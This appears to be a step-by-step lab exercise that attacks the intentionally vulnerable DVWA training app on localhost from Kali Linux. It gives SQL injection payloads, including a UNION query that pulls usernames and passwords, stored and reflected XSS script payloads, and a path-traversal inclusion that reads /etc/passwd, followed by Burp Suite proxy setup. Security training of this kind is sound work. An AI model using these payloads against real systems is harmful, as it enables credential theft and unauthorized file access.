# TASK3
Browser steps run inside Kali’s Firefox, pointed at http://127.0.0.1 (DVWA). Terminal steps run in Kali terminal.

Step 1 — Set DVWA security level
Go to http://127.0.0.1/security.php → set Security Level: Low → Submit

Step 2 — SQL Injection
Navigate to http://127.0.0.1/vulnerabilities/sqli/
Paste into the User ID field:

1' OR '1'='1

Then try:

1' UNION SELECT user, password FROM users-- -

Step 3 — Stored XSS
Go to http://127.0.0.1/vulnerabilities/xss_s/
Paste into the Message box:

<script>alert('Stored XSS')</script>

Step 4 — Reflected XSS
In Firefox address bar:

http://127.0.0.1/vulnerabilities/xss_r/?name=<script>alert('Reflected XSS')</script>

Step 5 — Local File Inclusion

http://127.0.0.1/vulnerabilities/fi/?page=../../../../etc/passwd

Step 6 — Burp Suite setup
Terminal:

bash
burpsuite

In Burp: Proxy → Options confirm listener is 127.0.0.1:8080
In Firefox: Settings → Network Settings → Manual proxy → HTTP Proxy 127.0.0.1 Port 8080
Turn Intercept ON in Burp, then reload a DVWA page to see the captured request.

Step 7 — Security headers check

bash
curl -I http://127.0.0.1
